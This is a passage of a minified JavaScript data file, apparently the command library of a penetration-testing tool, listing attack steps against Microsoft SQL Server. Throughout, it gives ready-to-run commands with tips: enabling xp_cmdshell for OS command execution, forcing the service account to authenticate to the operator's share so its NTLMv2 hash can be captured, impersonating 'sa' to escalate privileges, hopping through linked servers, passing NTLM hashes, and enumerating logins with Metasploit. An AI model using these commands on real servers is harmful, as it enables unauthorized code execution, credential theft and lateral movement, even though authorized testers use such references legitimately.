Object.assign(n[8526],{"tool":"impacket-mssqlclient","run":"impacket-mssqlclient '{{domain}}/{{user}}:{{password}}'@{{target}} -windows-auth","note":"Windows-auth syntax. For local SQL logins drop the domain: {{user}}:{{password}}@{{target}}.","operatorSurface40":"kali","operatorSurface41Source":"audited-v4.3","operatorSurface43Source":"audited-v4.3","opts":n[8527],"operatorSurface87Source":"audited-v8.7"});
n[8527].push(n[8528],n[8529],n[8530],n[8531]);
Object.assign(n[8528],{"flag":"-k","semantic":"Use Kerberos ticket cache","tip":"Authenticate with the current Kerberos cache instead of a plaintext password.","category":"Authentication","advanced":true});
Object.assign(n[8529],{"flag":"-no-pass","semantic":"Do not prompt for password","tip":"Pair with Kerberos or supplied key/hash material.","category":"Authentication","advanced":true});
Object.assign(n[8530],{"arg":"-hashes","semantic":"LM:NT hashes","placeholder":":31d6cfe0...","tip":"Authenticate with NTLM hash material when appropriate.","category":"Authentication"});
Object.assign(n[8531],{"flag":"-debug","semantic":"Debug protocol output","tip":"Show additional TDS/Impacket detail when the connection or authentication path is unclear.","category":"Output","advanced":true});
Object.assign(n[8532],{"tool":"impacket-mssqlclient","run":"EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE; EXEC xp_cmdshell 'whoami';","note":"Enable and test command execution. If this works you are running as the MSSQL service account — check whoami /priv immediately.","operatorSurface40":"kali","operatorSurface41Source":"audited-v4.3","operatorSurface43Source":"audited-v4.3"});
Object.assign(n[8533],{"tool":"impacket-mssqlclient","run":"EXEC master.dbo.xp_dirtree '\\\\{{lhost}}\\share';","note":"Coerces the service account to authenticate to YOUR responder share — captures its NTLMv2 hash even when xp_cmdshell is blocked. Service accounts are kerberoastable too, so you may already have it.","operatorSurface40":"kali","operatorSurface41Source":"audited-v4.3","operatorSurface43Source":"audited-v4.3"});
Object.assign(n[8534],{"tool":"impacket-mssqlclient","run":"EXEC sp_linkedservers;","note":"Linked servers = pre-authenticated hops to other SQL servers. EXEC ... AT [linked] to run queries through them.","operatorSurface40":"kali","operatorSurface41Source":"audited-v4.3","operatorSurface43Source":"audited-v4.3"});
Object.assign(n[8535],{"tool":"impacket-mssqlclient","run":"SELECT name FROM sys.server_principals WHERE type_desc = 'SQL_LOGIN'; EXECUTE AS LOGIN = 'sa'; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;","note":"Not sysadmin yourself? Check IMPERSONATE rights — EXECUTE AS LOGIN = 'sa' promotes you in-session. Enum: SELECT b.name FROM sys.server_permissions a JOIN sys.server_principals b ON a.grantee_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';","operatorSurface40":"kali","operatorSurface41Source":"audited-v4.3","operatorSurface43Source":"audited-v4.3"});
Object.assign(n[8536],{"tool":"nxc","run":"nxc mssql {{target}} -u {{user}} -p '{{password}}' -d {{domain}}","note":"Fast MSSQL authentication validation before selecting a database action.","operatorSurface40":"kali","operatorSurface78Source":"audited-v7.8"});
Object.assign(n[8537],{"tool":"bloodhound-cypher","run":"MATCH p=(u:Base)-[:SQLAdmin]->(c:Computer) RETURN p","note":"Identify SQLAdmin relationships. A graph edge is a candidate path, not proof of a live SQL login.","operatorSurface40":"kali","operatorSurface78Source":"audited-v7.8"});
Object.assign(n[8538],{"tool":"impacket-mssqlclient","run":"enum_db","note":"Inside mssqlclient: enumerate databases after authenticated SQL access is already proven.","operatorSurface40":"kali","operatorSurface78Source":"audited-v7.8"});
Object.assign(n[8539],{"tool":"impacket-mssqlclient","run":"enum_impersonate","note":"Inside mssqlclient: enumerate impersonation candidates. Candidate rights do not prove successful impersonation.","operatorSurface40":"kali","operatorSurface78Source":"audited-v7.8"});
Object.assign(n[8540],{"tool":"impacket-mssqlclient","run":"exec_as_login {{user}}","note":"Inside mssqlclient: move into a separately enumerated impersonatable login and preserve the returned SQL context.","operatorSurface40":"kali","operatorSurface78Source":"audited-v7.8"});
Object.assign(n[8541],{"tool":"impacket-mssqlclient","run":"xp_dir_tree \\{{lhost}}\\share","note":"Inside mssqlclient: trigger the reviewed SMB coercion path. The trigger is not inbound authentication or relay success.","operatorSurface40":"kali","operatorSurface78Source":"audited-v7.8"});
Object.assign(n[8542],{"tool":"impacket-mssqlclient","run":"enum_links","note":"Current Impacket linked-server inventory, preferred over stale trustlink/sp_linkedservers spellings while preserving source lineage.","operatorSurface40":"kali","operatorSurface78Source":"audited-v7.8","operatorSurface87Source":"audited-v8.7"});
Object.assign(n[8543],{"tool":"impacket-mssqlclient","run":"use_link {{target_sam}}","note":"Inside mssqlclient: enter a separately enumerated linked SQL server. Linked SQL context is not OS execution.","operatorSurface40":"kali","operatorSurface78Source":"audited-v7.8","operatorSurface87Source":"audited-v8.7"});
Object.assign(n[8544],{"tool":"impacket-mssqlclient","run":"EXEC sp_configure 'xp_cmdshell',0; RECONFIGURE;","note":"Cleanup: if xp_cmdshell was enabled solely for the authorized test, restore the prior disabled state after preserving Evidence.","operatorSurface40":"kali","operatorSurface78Source":"audited-v7.8"});
Object.assign(n[8545],{"tool":"msfconsole","run":"msfconsole -q -x \"use auxiliary/admin/mssql/mssql_enum_sql_logins; set RHOSTS {{target}}; set RPORT {{port}}; set USERNAME {{user}}; set PASSWORD {{password}}; run; exit\"","note":"Pinned MSSQL login-enumeration route. Enumerated names or candidates remain separate from successful authentication and database command execution.","operatorSurface40":"kali","operatorSurface83Source":"audited-v8.3"});
